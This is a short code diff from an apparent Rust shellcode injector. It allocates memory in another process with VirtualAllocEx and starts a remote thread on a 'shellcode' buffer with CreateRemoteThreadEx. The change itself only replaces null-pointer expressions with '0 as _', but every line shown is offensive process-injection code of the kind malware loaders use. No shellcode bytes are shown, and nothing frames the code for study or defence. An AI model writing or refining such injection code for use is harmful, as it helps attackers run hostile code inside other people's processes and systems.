@@ -32,7 +32,7 @@ fn main() {
     // alloc payload
     let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
         handle,
-        std::ptr::null_mut(),
+        0 as _,
         shellcode.len(),
         MEM_COMMIT,
         PAGE_READWRITE
@@ -57,12 +57,12 @@ fn main() {
     )};
     let _ = unsafe {CreateRemoteThreadEx().unwrap()(
         handle,
-        std::ptr::null_mut(),
+        0 as _,
         0,
         std::mem::transmute(addr_shellcode),
         0 as _,
         0,
-        std::ptr::null_mut(),
+        0 as _,
         0 as _
     )};
 }
